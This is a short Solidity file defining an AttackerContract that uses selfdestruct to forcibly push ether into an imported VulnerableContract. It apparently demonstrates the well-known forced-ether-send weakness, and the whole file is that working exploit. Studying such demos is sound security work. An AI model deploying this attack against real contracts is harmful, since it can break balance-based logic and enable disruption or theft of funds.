// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

import "./VulnerableContract.sol";

/**
 * @title VulnerableContract
 * @dev This contract will forcibly send ether to a vulnerable contract
 */
contract AttackerContract {
    VulnerableContract public vulnerableContract;
    
    /// Initialize the Attacker contract with the address of the vulnerable contract.
    constructor(address _vulnerableContract) {
        vulnerableContract = VulnerableContract(payable(_vulnerableContract));
    }

    /// Used to forcibly send either to the vulnerable contract
    function attack() public payable {
        require(msg.value > 0);
        address payable addr = payable(address(vulnerableContract));
        selfdestruct(addr);
    }
}